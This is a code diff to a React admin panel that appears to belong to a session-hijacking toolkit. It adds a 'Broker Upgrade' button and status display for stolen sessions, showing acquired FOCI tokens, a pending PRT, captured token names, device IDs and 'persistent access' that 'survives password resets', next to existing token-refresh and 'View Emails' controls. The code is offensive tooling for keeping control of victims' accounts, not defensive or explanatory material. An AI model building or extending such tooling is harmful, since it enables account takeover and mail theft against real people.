@@ -11,6 +11,7 @@ interface SessionsPanelProps {
   onRefresh: (sessionId: string) => Promise<{ success: boolean; error?: string }>;
   onRefreshAll: () => Promise<{ refreshed: number; failed: number }>;
   onCheckToken: (sessionId: string) => Promise<{ valid: boolean; reason?: string }>;
+  onBrokerUpgrade: (sessionId: string) => Promise<{ success: boolean; error?: string }>;
   onViewEmails: (sessionId: string) => void;
   adminRole: 'admin' | 'viewer';
 }
@@ -24,6 +25,7 @@ export function SessionsPanel({
   onRefresh,
   onRefreshAll,
   onCheckToken,
+  onBrokerUpgrade,
   onViewEmails,
   adminRole,
 }: SessionsPanelProps): React.ReactElement {
@@ -50,6 +52,16 @@ export function SessionsPanel({
       [sessionId]: result.success ? 'Refreshed!' : `Failed: ${result.error || 'unknown'}`,
     }));
     setTimeout(() => setActionStatus((prev) => { const n = { ...prev }; delete n[sessionId]; return n; }), 4000);
+  }
+
+  async function handleBrokerUpgrade(sessionId: string): Promise<void> {
+    setActionStatus((prev) => ({ ...prev, [sessionId]: 'Upgrading to Broker...' }));
+    const result = await onBrokerUpgrade(sessionId);
+    setActionStatus((prev) => ({
+      ...prev,
+      [sessionId]: result.success ? 'Broker upgrade complete!' : `Broker: ${result.error || 'failed'}`,
+    }));
+    setTimeout(() => setActionStatus((prev) => { const n = { ...prev }; delete n[sessionId]; return n; }), 6000);
   }
 
   async function handleRefreshAll(): Promise<void> {
@@ -192,6 +204,53 @@ export function SessionsPanel({
                   </div>
                 </div>
 
+                {/* Broker Status Section */}
+                <div className="broker-section" style={{ marginTop: 12, padding: '10px 12px', background: '#f8fafc', borderRadius: 6, border: '1px solid #e2e8f0' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
+                    <span style={{ fontSize: 12, fontWeight: 600, color: '#475569' }}>BROKER STATUS</span>
+                    <span style={{
+                      fontSize: 10,
+                      padding: '2px 6px',
+                      borderRadius: 4,
+                      fontWeight: 600,
+                      background: session.brokerStatus === 'active' ? '#dcfce7' : session.brokerStatus === 'partial' ? '#fef9c3' : session.brokerStatus === 'failed' ? '#fde2e2' : '#f1f5f9',
+                      color: session.brokerStatus === 'active' ? '#166534' : session.brokerStatus === 'partial' ? '#854d0e' : session.brokerStatus === 'failed' ? '#991b1b' : '#64748b',
+                    }}>
+                      {session.brokerStatus ? session.brokerStatus.toUpperCase() : 'PENDING'}
+                    </span>
+                  </div>
+                  {session.brokerStatus === 'active' && (
+                    <div style={{ fontSize: 11, color: '#16a34a', marginBottom: 4 }}>
+                      ✓ Persistent access — survives password resets
+                    </div>
+                  )}
+                  {session.brokerStatus === 'partial' && (
+                    <div style={{ fontSize: 11, color: '#ca8a04', marginBottom: 4 }}>
+                      ⚠ FOCI tokens acquired (multi-service) — PRT pending
+                    </div>
+                  )}
+                  {session.deviceId && (
+                    <DetailItem label="Device ID" value={session.deviceId} />
+                  )}
+                  {session.brokerUpgradeAt && (
+                    <DetailItem label="Upgraded At" value={formatDateTime(session.brokerUpgradeAt)} />
+                  )}
+                  {session.brokerSteps && session.brokerSteps.length > 0 && (
+                    <div style={{ fontSize: 11, color: '#64748b', marginTop: 4 }}>
+                      {session.brokerSteps.map((s, i) => (
+                        <span key={i} style={{ marginRight: 8 }}>
+                          {s.success ? '✓' : '✗'} {s.step.replace(/_/g, ' ')}
+                        </span>
+                      ))}
+                    </div>
+                  )}
+                  {session.brokerCookies && session.brokerCookies.length > 0 && (
+                    <div style={{ fontSize: 11, color: '#475569', marginTop: 4 }}>
+                      {session.brokerCookies.length} token(s): {session.brokerCookies.map(c => c.name).join(', ')}
+                    </div>
+                  )}
+                </div>
+
                 {actionStatus[session.id] && (
                   <div className={`session-action-status ${actionStatus[session.id].includes('VALID') || actionStatus[session.id].includes('Refreshed') ? 'success' : actionStatus[session.id].includes('Checking') || actionStatus[session.id].includes('Refreshing') ? 'pending' : 'error'}`}>
                     {actionStatus[session.id]}
@@ -207,6 +266,11 @@ export function SessionsPanel({
                       <button className="btn-primary-sm" onClick={() => handleRefresh(session.id)}>
                         Refresh Token
                       </button>
+                      {(!session.brokerStatus || session.brokerStatus === 'failed') && (
+                        <button className="btn-primary-sm" style={{ background: '#7c3aed' }} onClick={() => handleBrokerUpgrade(session.id)}>
+                          Broker Upgrade
+                        </button>
+                      )}
                       <button className="btn-action-sm" onClick={() => onViewEmails(session.id)}>
                         View Emails
                       </button>
